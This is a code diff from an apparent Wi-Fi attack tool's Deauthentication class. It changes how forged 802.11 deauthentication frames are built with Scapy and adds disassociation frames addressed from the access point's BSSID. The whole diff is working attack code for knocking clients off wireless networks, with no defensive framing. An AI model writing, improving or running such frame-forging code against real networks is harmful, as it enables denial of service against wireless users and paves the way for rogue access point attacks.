@@ -59,11 +59,16 @@ class Deauthentication(object):
         :rtype: None
         """
 
-        packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
-                    addr1=receiver, addr2=sender, addr3=sender) \
+        deauth_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
+                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
                   / dot11.Dot11Deauth())
 
-        self._deauthentication_packets.append(packet)
+        disassoc_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=10, \
+                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
+                  / dot11.Dot11Disas())
+        
+        self._deauthentication_packets.append(disassoc_packet)
+        self._deauthentication_packets.append(deauth_packet)
 
     def _process_packet(self, packet):
         """
